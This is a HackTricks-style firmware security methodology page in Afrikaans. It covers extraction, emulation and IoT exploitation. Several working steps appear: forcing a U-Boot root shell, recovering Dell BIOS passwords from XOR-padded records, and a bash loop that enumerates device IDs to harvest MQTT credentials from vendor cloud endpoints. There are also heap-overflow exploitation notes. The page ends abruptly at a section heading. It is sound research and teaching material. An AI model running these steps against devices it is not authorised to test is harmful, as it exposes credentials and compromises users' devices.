# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante hulpbronne

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, wat verseker dat die toestel van die oomblik dat dit aangeskakel word toegang tot noodsaaklike instruksies het, sodat die bedryfstelsel kan begin. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap om sekuriteitskwesbaarhede te identifiseer.<sup>[[2]](#references)[[3]](#references)</sup>

## **Insameling van inligting**

**Insameling van inligting** is ’n kritieke eerste stap om te verstaan waaruit ’n toestel bestaan en watter tegnologieë dit gebruik. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en bedryfstelsel waarop dit werk
- Besonderhede oor die bootloader
- Hardeware-uitleg en databladte
- Maatstawwe oor die kodebasis en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-nutsmiddels van onskatbare waarde, asook die ontleding van enige beskikbare open-source sagtewarekomponente deur handmatige en geoutomatiseerde hersieningsprosesse. Nutsmiddels soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om moontlike probleme te vind.

## **Verkryging van die firmware**

Firmware kan op verskeie maniere verkry word, elk met sy eie kompleksiteitsvlak:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- Deur dit **te bou** volgens die verskafte instruksies
- Deur dit **af te laai** vanaf amptelike ondersteuningswebwerwe
- Deur **Google dork**-navrae te gebruik om gehoste firmwarelêers te vind
- Deur direk toegang tot **cloud storage** te kry, met nutsmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit uit die toestel te **onttrek** via verbindings soos **UART**, **JTAG** of **PICit**
- Deur na opdateringsversoeke binne toestelkommunikasie te **snuffel**
- Deur **hardgekodeerde opdateringseindpunte** te identifiseer en te gebruik
- Deur dit vanaf die bootloader of netwerk te **dump**
- Deur die stoorskyfie te **verwyder en te lees** wanneer niks anders werk nie, met gepaste hardeware-nutsmiddels

### Slegs UART-logboeke: forseer ’n root shell via U-Boot-omgewing in flash

As UART RX geïgnoreer word (slegs logboeke), kan jy steeds ’n init-shell forseer deur die **U-Boot-omgewingsblob** vanlyn te **wysig**:<sup>[[6]](#references)</sup>

1. Dump die SPI-flash met ’n SOIC-8-knippie en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Vind die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot env CRC32 vir die blob weer**.
3. Flits slegs die env-partisie weer en herlaai; ’n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die selflaaiprogram se shell gedeaktiveer is, maar die env-partisie via eksterne flashtoegang geskryf kan word.

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Hier is verskillende nutsmiddels wat jy hiervoor kan gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsgoed vind nie, kontroleer die **entropie** van die beeld met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie encrypted nie. As die entropie hoog is, is dit waarskynlik encrypted (of op een of ander manier saamgepers).

Boonop kan jy hierdie nutsgoed gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of gebruik [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te ondersoek.

### Differensiële flash-analise en herwinbare XOR-geheimeberging

Wanneer ’n firmware-instelling geen gedokumenteerde bergingsformaat het nie, neem eers verskeie ooreenstemmende flash-lesings, verander **presies een** instelling, dump die volledige skyfie weer en vergelyk die offsets. Deur die eksperiment met beheerde waardes te herhaal, kan jy die instelling van tellers en skryfmetadata onderskei; veranderinge by nuwe offsets eerder as in plek dui op ’n slegs-byvoeging- of loggestruktureerde berging. Behou geskrapte en tombstone-gemerkte inskrywings, aangesien hul payload-grepe dalk steeds herstel kan word.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nadat jy die streek opgespoor het, onttrek die firmware-modules met nutsgoed soos `binwalk` en reverse-engineer die writer/validator in Ghidra. Bevestig veldgrense, opvulling, sleutelindeksering en sleutelafleiding in die kode, eerder as om die skema slegs uit die syferteks-patrone af te lei.<sup>[[10]](#references)</sup>

#### Herwin sleutels uit geënkripteerde nulopvulling

Soos beskryf in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), onthul bekende plainteks keystroomgrepe op dieselfde afsetposisies. ’n Veld met ’n vaste grootte is besonder kwesbaar wanneer die nulopvulling elke indeks van ’n herhalende XOR-sleutel dek: die geënkripteerde opvulling onthul daardie sleutelgrepe direk, omdat `0x00 XOR key_byte = key_byte`. As elke sleutelindeks gedek word, rekonstrueer die sleutel uit die syferteks se laaste grepe en dekripteer die ingevulde grepe.<sup>[[10]](#references)</sup>

Dell se kwesbare DVAR BIOS-wagwoordformaat is ’n konkrete voorbeeld: greep `0` van ’n 32-greep-veld is plainteks, terwyl grepe `1..31` ’n herhalende 20-greep-sleutel gebruik.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Vir 'n wagwoordlengte `L` was posisies `L..31` nul voor XOR. Wanneer `L <= 12`, dek dié posisies elke sleutelindeks, dus word die volledige sleutel en wagwoord sonder brute force herwin:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Onttrek sleutels uit historiese rekords

Moenie elke rekord afsonderlik ontleed nie. Die DVAR-sleutel word ongeveer afgelei as `modified_md5(device_seed || variable_GUID || password[0])`: die device seed en GUID is vas, en die enigste password-afhanklike inset is die eerste byte in duidelike teks. Dit gee hoogstens 256 sleutels per device, en rekords wat met dieselfde byte begin, deel dus ’n sleutel. Groepeer aktiewe en geskrapte rekords volgens daardie byte; ’n kort historiese rekord kan die volledige sleutel deur padding uitlek en ’n huidige langer rekord dekripteer waarvan die eie padding onvoldoende is. Password-rotasie kan dus die blootstelling verhoog wanneer ou ciphertext getombstone word eerder as uitgevee.<sup>[[10]](#references)</sup>

Die [`dellpwn`](https://github.com/R3n5k1/dellpwn)-tool vind DVAR, valideer kandidaat-rekords, herwin passwords en kan rou gestoorde/sleutelbytes vertoon. Bou dit vanaf ’n checkout en skandeer ’n geverifieerde flash-image soos volg:<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Vir pasgemaakte parsers, verwerp vals positiewe resultate deur rekordstruktuur, beperkings op drukbare karakters, nulopvullingkontroles, sleutel-entropie en konsekwentheid waar die sleutel omvou, te gebruik. As herhaalde dumps yl bisflips per skryfaksie toon, lys die waargenome maskers en rangskik die regstellings volgens hierdie beperkings, maar rapporteer dubbelsinnige karakters eerder as om heuristiese uitvoer as presiese herstel voor te stel.<sup>[[10]](#references)</sup>

Wagwoordverifieerders behoort ’n gesoute, herhaaldelik toegepaste eenrigting-hash te stoor eerder as omkeerbare geënkripteerde teks, en log-gestruktureerde stoorstelsels behoort vervangde geheime materiaal veilig te verwyder.<sup>[[10]](#references)</sup>

### Verkryging van die lêerstelsel

Met die vorige kommentaarhulpmiddels soos `binwalk -ev <bin>` behoort jy die **lêerstelsel te kon onttrek**.\
Binwalk onttrek dit gewoonlik in ’n **lêergids met die naam van die lêerstelseltipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige onttrekking van die lêerstelsel

Soms sal binwalk **nie die magiese greep van die lêerstelsel in sy handtekeninge hê nie**. Gebruik in sulke gevalle binwalk om **die offset van die lêerstelsel te vind en die saamgeperste lêerstelsel** uit die binêre lêer te sny, en **onttrek** die lêerstelsel dan **handmatig** volgens die tipe daarvan, met die stappe hieronder.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd command** uit om die Squashfs-lêerstelsel te carve.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (wat in die voorbeeld hierbo gebruik word)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die "`squashfs-root`"-gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware ontleed

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsgoed om die firmwarebeeld te ontleed en waardevolle data daaruit te onttrek.

### Aanvanklike ontledingsnutsgoed

’n Stel opdragte word gegee vir aanvanklike inspeksie van die binêre lêer (hierna `<bin>` genoem). Hierdie opdragte help om lêertipes te identifiseer, stringe te onttrek, binêre data te ontleed en die partisie- en lêerstelselbesonderhede te verstaan:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die image te bepaal, word die **entropie** met `binwalk -E <bin>` nagegaan. Lae entropie dui op ’n gebrek aan enkripsie, terwyl hoë entropie moontlike enkripsie of kompressie aandui.

Vir die onttrekking van **ingebedde lêers** word nutsmiddels en hulpbronne soos die **file-data-carving-recovery-tools**-dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe herken nie omdat magic bytes ontbreek, is handmatige onttrekking nodig. Dit behels dat `binwalk` gebruik word om die lêerstelsel se offset te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te kerf:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig te onttrek, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel onttrek is, begin die soektog na sekuriteitsfoute. Daar word aandag gegee aan onveilige netwerkdaemone, hardgekodeerde geloofsbriewe, API-eindpunte, funksionaliteit van opdateringsbedieners, ongekompileerde kode, opstartscripts en saamgestelde binaries vir vanlyn ontleding.

**Belangrike liggings** en **items** om te inspekteer, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en scriptlêers vir moontlike kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestelwebbedieners en binaries

Verskeie nutsprogramme help om sensitiewe inligting en kwesbaarhede in die lêerstelsel te ontdek:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om na sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op saamgestelde binaries

Beide bronkode en saamgestelde binaries wat in die lêerstelsel gevind word, moet vir kwesbaarhede ondersoek word. Nutsprogramme soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Verkryging van cloud-konfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie van ’n cloud-eindpunt af wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy vind dat `<token>` plaaslik van die toestel-ID afgelei word met behulp van ’n hardgekodeerde geheim, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY bekom in staat om die URL te rekonstrueer en die cloud-konfigurasie af te laai, wat dikwels MQTT-geloofsbriewe in gewone teks en onderwerpvoorvoegsels openbaar.

Praktiese werksvloei:

1) Onttrek deviceId uit UART-selflaailogboeke

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) aan en neem die logboeke vas:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na reëls wat die cloud config-URL-patroon en broker-adres uitvoer, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config-pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en maak die digest hoofletters:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Versamel cloud-konfigurasie en MQTT credentials

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om geheime uit te haal:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic-ACL's (indien teenwoordig)

- Gebruik herwonne geloofsbriewe om op onderhoudsonderwerpe in te teken en na sensitiewe gebeure te soek:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Lys voorspelbare toestel-ID's op (op groot skaal, met magtiging)

- Baie ekosisteme sluit verskaffer-OUI-/produk-/tipegrepe in, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's iteratief deurloop, tokens aflei en konfigurasies programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Aantekeninge
- Verkry altyd uitdruklike toestemming voordat jy met massatelling begin.
- Verkies emulering of statiese analise om geheime te herwin sonder om teikenhardeware te verander, waar moontlik.


Die proses om firmware te emuleer maak **dynamic analysis** moontlik van óf ’n toestel se werking óf ’n individuele program. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede oplewer, maar deur die root filesystem of spesifieke binaries oor te dra na ’n toestel met ’n ooreenstemmende argitektuur en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik word.

### Emulering van individuele binaries

Wanneer enkele programme ondersoek word, is dit noodsaaklik om die program se endianness en CPU-argitektuur te identifiseer.

#### Voorbeeld met MIPS-argitektuur

Om ’n binary met MIPS-argitektuur te emuleer, kan jy die volgende opdrag gebruik:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian-binêre lêers is `qemu-mipsel` die aangewese keuse.

#### ARM-argitektuuremulasie

Vir ARM-binêre lêers is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volledige stelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander vergemaklik volledige firmware-emulasie, deur die proses te outomatiseer en dinamiese ontleding te ondersteun.

### Heropbou van gesplete en geverifieerde wortellêerstelsels vir emulasie

As ’n SquashFS-superblok leesbaar is, maar inode-, gids- of fragmenttabel-afsetwaardes onmoontlik lyk, moenie `unsquashfs` onmiddellik regmaak nie. Reverse-engineer die vroeë selflaaibinêre lêer en reproduseer die bloktoestelgrafiek wat dit skep: ingebedde stelsels kan ’n nominale wortelpartisie blootstel, maar die werklike lêerstelsel met ’n `dm-linear`-kartering bou wat sektore byvoeg wat van ’n ander partisie geleen is. Kontroles wat net die superblok nagaan, kan slaag selfs wanneer elke latere metadatablok verskuif is.<sup>[[9]](#references)</sup>

Behoud die firmware se rekenkunde presies. Bepaal veral of lengtes in grepe, 512-greep-sektore of 4 KiB-bladsye uitgedruk word; reproduseer verskuiwings en afkapping in hul oorspronklike volgorde; en neem bankafhanklike eindstreke in A/B-uitlegte in ag. Byvoorbeeld, `(partition_bytes >> 12) << 3` kap eers af tot ’n 4 KiB-grens en druk die resultaat daarna as 512-greep-sektore uit; as jy dit met `partition_bytes // 512` vervang, kan die bygevoegde omvang met ’n paar kilogrepe verskuif en alle daaropvolgende SquashFS-tabelle beskadig.<sup>[[9]](#references)</sup>

’n Nuttige valideringswerkvloei is:<sup>[[9]](#references)</sup>

1. Bepaal die brontoestel, beginsektor en lengte van elke `dm-linear`-segment uit die verifier/init-binêre lêer.
2. Voeg die omvangs saam of karteer hulle sonder om hul belyningssemantiek te verander.
3. As onttrekking steeds misluk, soek slegs ’n klein venster om die voorspelde grens en vereis verskeie opeenvolgende geldige metadatastrukture, eerder as om net ’n aanneemlike superblok te aanvaar.
4. Voer ’n ongewysigde `unsquashfs` op die gerekonstrueerde beeld uit; suksesvolle deurloop van alle gidse en fragmente is sterker bewys as `unsquashfs -stat`.

#### Analyst-beheerde dm-verity-vervanging

Wanneer die analyst die QEMU-kern, initramfs en virtuele skywe beheer, kan ’n gewysigde wortel selflaai deur die verkoper se verifier-PID 1 met ’n klein staties gekoppelde init te vervang. Dit is ’n **lab-selflaaikettingvervanging**, nie ’n omseiling van dm-verity, sy RSA-handtekening, Secure Boot of ’n TPM-verseëlde sleutel nie.<sup>[[9]](#references)</sup>

Die vervangende init behoort die operasionele dele van die oorspronklike selflaaipad na te boots: monteer `devtmpfs`, roep `setsid()` aan, koppel `/dev/console` aan lêerbeskrywers 0–2, monteer `/proc` en `/sys`, wag vir die verskafte bloktoestel, monteer die gewysigde wortel as leesalleen, ontkoppel die pseudo-lêerstelsels van die ou wortel, skuif die nuwe montering na `/`, voer `chroot` uit en roep die firmware se oorspronklike `/sbin/init` met `execve()` aan. Deur `/dev`, `/proc` en `/sys` **voor** `MS_MOVE` te ontkoppel, voorkom jy dat monteringspunte wat aan die nuwe wortel behoort, per ongeluk ontkoppel word.<sup>[[9]](#references)</sup>

Hou veranderbare toesteltoestand apart van die gewysigde onveranderlike wortel. ’n qcow2-oorleg kan die oorspronklike skyf se LVM-toestand bewaar terwyl ’n tweede leesalleen virtio-skyf die gewysigde SquashFS verskaf:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Ontfouting van die beeldtoestand vanlyn

Inspekteer volgehoue toestand buite die guest wanneer stadige opstarts, vernietigende opstartscripts of onbetroubare konsole-aanmelding die fout verberg. Koppel nooit ’n overlay aan wat ’n lopende VM gebruik nie; stel dit met `qemu-nbd` bloot, beperk LVM-ontdekking tot die bedoelde NBD-partisie en deaktiveer die volumegroep voordat jy dit ontkoppel.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Vir herhaalbare foutisolasie, skryf tydstempelmerkerlêers na ’n stabiele skryfbare volume en verifieer hulle vanlyn; `/dev/kmsg`, FIFOs en tydelike konsoles kan vals negatiewe resultate oplewer weens koersbeperking of omdat prosesse voortydig beëindig word. Vergelyk ook presiese koppelvlakke oor lae heen voordat jy onverwante kode verander: `uname -r` teenoor `/lib/modules/`, ext4-kenmerke op skyf teenoor kernkonfigurasie, en die Mesa `libGL`-generasie teenoor die DRI-driver-ABI en PCI-afgeleide drivernamme. ’n Komponent kan bestaan en selfs suksesvol met `dlopen()` gelaai word, maar steeds onbruikbaar wees omdat die verbruiker ’n ander ABI verwag.<sup>[[9]](#references)</sup>

## Dinamiese analise in die praktyk

Op hierdie stadium word ’n werklike of geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die bedryfstelsel en lêerstelsel te behou. Emulasie boots moontlik nie hardeware-interaksies perfek na nie, wat soms herbegin van die emulasie noodsaak. Die analise moet die lêerstelsel weer ondersoek, blootgestelde webblaaie en netwerkdienste uitbuit, en kwesbaarhede in die selflaaiprogram verken. Firmware-integriteitstoetse is van kritieke belang om moontlike backdoor-kwesbaarhede te identifiseer.

## Tegnieke vir looptydanalise

Looptydanalise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing, met nutsmiddels soos gdb-multiarch, Frida en Ghidra om breekpunte te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige debugger, **kopieer ’n staties gekoppelde `gdbserver`** na die toestel en koppel dit op afstand aan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor-boodskapkartering

Op IoT-hubs word die RF-stack dikwels tussen ’n **radio-MCU** en ’n Linux-userlandproses verdeel. ’n Nuttige werkvloei is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF-raam** deur die lug
2. **beheerderkant-parser** op die radio-MCU
3. **seriële/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **toepassingsdispatcher** in die hoofdemon
5. **protokolspesifieke handler / toestandsmasjien**

Hierdie argitektuur skep twee omgekeerde-ingenieurswese-teikens in plaas van een. As die beheerder binêre radiokrame na ’n teksprotokol soos `Group,Command,arg1,arg2,...` omskakel, spoor die volgende op:

- Die **boodskapgroepe** en dispatch-tabelle
- Watter boodskappe van die **netwerk** kan kom teenoor dié wat van die beheerder self kom
- Die presiese **vervaardigerspesifieke diskrimineerdervelde** (byvoorbeeld Zigbee `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter handlers slegs bereikbaar is tydens **commissioning**, ontdekking of aflaaifases vir firmware/modelle

Vir Zigbee spesifiek: neem die paringsverkeer vas en kyk of die teiken steeds op die verstek-**Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan die afluistering van commissioning-verkeer die **Network Key** blootlê. Zigbee 3.0-install codes verminder hierdie blootstelling; let dus op of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protokolhandlers en FSM-beheerde bereikbaarheid

Vervaardigerspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters, omdat hulle **pasgemaakte ontledingskode** en interne **FSM’s** bereik wat minder deeglik getoetsde validering het.<sup>[[8]](#references)</sup>

Praktiese werkvloei:

- Volg die opdragdispatcher deur die kode om die **handler wat slegs vir die vervaardiger bedoel is**, te vind.
- Herwin die tabelle vir **FSM-toestand**, **gebeurtenis**, **kontrole**, **aksie** en **volgende toestand**.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, asook herprobeer-/foutvertakkings wat uiteindelik aanvallerbeheerde toestand terugstel of vrystel.
- Bevestig watter wettige protokoluitruilings nodig is om die daemoon in die kwesbare toestand te plaas, eerder as om aan te neem dat die foutiewe handler altyd bereikbaar is.

Vir tydsensitiewe protokolle kan pakketherhaling vanuit ’n Python-raamwerk te stadig wees. ’n Betroubaarder benadering is om ’n wettige toestel op werklike hardeware (byvoorbeeld ’n **nRF52840**) met ’n vervaardigergehalte-stack na te boots, sodat jy die korrekte **eindpunte**, **attribute** en commissioning-tydsberekening kan blootlê.

### Foutklas vir gefragmenteerde aflaaie in ingebedde daemone

’n Herhalende firmware-foutklas kom voor in **gefragmenteerde blob-/model-/konfigurasie-aflaaie**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakketplaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **oorspronklike toegekende grootte** te kontroleer.

Dit stel ’n aanvaller in staat om:

- ’n Eerste geldige fragment met ’n **klein** verklaarde totale grootte te stuur om ’n klein heap-toekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`, te stuur.
- ’n vervalste pakketplaaslike grootte te gebruik wat die nuwe kontroles slaag, maar steeds die oorspronklik toegekende buffer oorloop.

Wanneer die kwesbare pad agter commissioning-logika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken in die verwagte modelaflaai- of blobaflaaitoestand te bring voordat die misvormde fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde daemone is die maklikste manier om heap-metadata-uitbuiting te aktiveer dikwels nie om “vir opruiming te wag” nie, maar om **die protokol se eie foutafhandeling af te dwing**:<sup>[[8]](#references)</sup>

- Stuur misvormde opvolgfragmente om die FSM na **herprobeer-** of **fouttoestande** te stuur.
- Oorskry die herprobeerdrempel sodat die daemoon **konteks terugstel** en die beskadigde buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om allocator-kant-primitiewe te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** allocators in ingebedde Linux, waar die beskadiging van chunk-metadata unlink/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te beskadig om allocator-deursoeking na **vals chunks wat binne die oorlopende buffer geplaas is**, te herlei, eerder as om werklike bin-wysers onmiddellik te beskadig en die proses te laat ineenstort.

## Binary Exploitation and Proof-of-Concept

Om ’n PoC vir geïdentifiseerde kwesbaarhede te ontwikkel, vereis ’n diep begrip van die teikenargitektuur en programmering in laevlaktale. Binêre looptydbeskermings is skaars in ingebedde stelsels, maar wanneer dit teenwoordig is, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc fastbin-uitbuitingsnotas (ingebedde Linux)

